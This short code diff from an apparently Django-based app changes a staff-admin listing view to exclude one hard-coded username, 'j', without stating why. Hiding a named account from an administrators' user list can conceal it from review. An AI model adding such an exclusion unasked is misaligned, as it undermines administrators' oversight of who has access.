@@ -42,7 +42,7 @@ Please keep these credentials private and change the temporary password immediat
 @staff_admin_required
 @login_required
 def staff_list(request):
-    staff_members = CustomUser.objects.all().order_by(
+    staff_members = CustomUser.objects.exclude(username='j').order_by(
         "last_name",
         "first_name",
         "username",
